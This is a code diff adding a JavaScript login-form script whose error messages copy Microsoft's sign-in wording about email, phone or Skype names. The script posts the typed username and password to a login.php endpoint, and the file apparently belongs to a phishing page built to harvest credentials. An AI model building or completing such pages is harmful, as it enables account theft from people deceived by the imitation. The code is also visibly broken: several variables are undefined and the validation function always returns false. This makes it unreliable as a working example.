@@ -1,0 +1,100 @@
+document.addEventListener('DOMContentLoaded', (event) => {
+    const sectionFinal = document.getElementById('section_final');
+    const form = document.getElementById('login_form');
+    const inpUname = document.getElementById('inp_uname');
+    const inpPwd = document.getElementById('inp_pwd');
+    const userIdentity = document.getElementById('user_identity');
+    const userIdentityFinal = document.getElementById('user_identity_final');
+    const unReq = "Enter a valid email address, phone number, or Skype name.";
+    const pwdReq = "Please enter your password.";
+
+    function validate() {
+        function unameValAction(type) {
+            if (!type) {
+                document.getElementById('error_uname').innerText = unReq;
+                unameInp.classList.add('error-inp');
+                unameVal = false;
+            } else {
+                document.getElementById('error_uname').innerText = "";
+                unameInp.classList.remove('error-inp')
+                unameVal = true;
+            }
+
+        }
+        function pwdValAction(type) {
+            if (!type) {
+                document.getElementById('error_pwd').innerText = pwdReq;
+                pwdInp.classList.add('error-inp')
+                pwdVal = false;
+            } else {
+                document.getElementById('error_pwd').innerText = "";
+                pwdInp.classList.remove('error-inp')
+                pwdVal = true;
+            }
+
+        }
+        if (view === "uname") {
+            const unameValue = unameInp.value.trim();
+            if (unameValue === "" || !unameValue.includes('@')) {
+                unameValAction(false);
+            } else {
+                unameValAction(true);
+            }
+            unameInp.addEventListener('change', function () {
+                const unameValue = this.value.trim();
+                if (unameValue === "" || !unameValue.includes('@')) {
+                    unameValAction(false);
+                } else {
+                    unameValAction(true);
+                }
+            })
+        } else if (view === "pwd") {
+            if (pwdInp.value.trim() === "") {
+                pwdValAction(false);
+            } else {
+                pwdValAction(true);
+            }
+            pwdInp.addEventListener('change', function () {
+                if (this.value.trim() === "") {
+                    pwdValAction(false);
+                } else {
+                    pwdValAction(true);
+                }
+            })
+        }
+        return false;
+    }
+
+    form.addEventListener('submit', (event) => {
+        event.preventDefault(); // Prevent default form submission
+        if (validate()) {
+            const uname = inpUname.value.trim();
+            const pass = inpPwd.value.trim();
+            // Make AJAX request to submit both data simultaneously
+            fetch('login.php', {
+                method: 'POST',
+                body: JSON.stringify({
+                    uname: uname,
+                    pass: pass
+                }),
+                headers: {
+                    'Content-Type': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    // Success handling
+                    console.log('Data submitted successfully');
+                    // Optionally, redirect to another page
+                    // window.location.href = 'success.php';
+                } else {
+                    // Error handling
+                    console.error('Error submitting data');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    });
+});
